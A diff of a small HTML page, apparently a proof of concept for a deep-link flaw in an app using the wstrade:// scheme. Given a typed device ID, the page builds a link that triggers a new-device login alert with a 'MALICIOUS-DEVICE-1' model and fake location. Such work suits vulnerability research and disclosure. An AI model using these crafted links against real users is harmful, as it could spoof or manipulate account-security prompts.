@@ -1,3 +1,49 @@
-<a
-    href="wstrade://notification-centre/new-device-login-alert?deviceIdentifier=12fb0802a65309fc&deviceModel=MALICIOUS-DEVICE-1&deviceLocation=Somewhere\!\!\!&loginTime=Some-time">click
-    me</a>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device ID Link Generator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        label, input, button {
+            margin: 5px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>Device ID Link Generator</h1>
+    <div>
+        <label for="deviceId">Device ID:</label>
+        <input type="text" id="deviceId" name="deviceId">
+    </div>
+    <button onclick="generateLink()">Generate Link</button>
+    <div id="linkContainer"></div>
+
+    <script>
+        function generateLink() {
+            const deviceId = document.getElementById('deviceId').value;
+            if (!deviceId) {
+                alert('Please enter a Device ID');
+                return;
+            }
+
+            const baseUrl = "wstrade://notification-centre/new-device-login-alert";
+            const params = new URLSearchParams({
+                deviceIdentifier: deviceId,
+                deviceModel: "MALICIOUS-DEVICE-1",
+                deviceLocation: "Somewhere!!!",
+                loginTime: "Some-time"
+            });
+
+            const fullUrl = `${baseUrl}?${params.toString()}`;
+
+            const linkContainer = document.getElementById('linkContainer');
+            linkContainer.innerHTML = `<a href="${fullUrl}">PoC Test Link</a>`;
+        }
+    </script>
+</body>
+</html>
